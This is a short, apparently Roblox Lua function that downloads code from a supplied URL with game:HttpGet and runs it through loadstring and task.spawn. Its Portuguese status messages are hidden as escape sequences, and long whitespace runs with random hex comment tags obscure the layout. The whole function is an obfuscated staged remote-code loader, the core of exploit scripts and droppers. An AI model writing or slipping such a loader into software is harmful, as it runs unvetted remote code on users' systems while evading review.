local function load_stage(url, stage_name)
    print("\x49\x6e\x69\x63\x69\x61\x6e\x64\x6f\x20" .. stage_name .. "\x2e\x2e\x2e")
    local success, result = pcall(function()
                                                                                                                                                                                        -- 072113d5fd
        return game:HttpGet(url)
    end)
    
    if success and result then
        local func, err = loadstring(result)
        if func then
            task.spawn(func)
                                                                                          -- be704480af
            return true
        else
                                                                                                                                       -- 8fa5c0df6f
            warn("\x45\x72\x72\x6f\x20\x61\x6f\x20\x63\x6f\x6d\x70\x69\x6c\x61\x72\x20" .. stage_name .. ": " .. tostring(err))
        end
    else
        warn("\69\114\114\111\32\97\111\32\98\97\105\120\97\114\32" .. stage_name)
    end
                                                                                                                                                           -- e148fba62e
    return false
                                                                                                                                          -- d63d536e5a
end
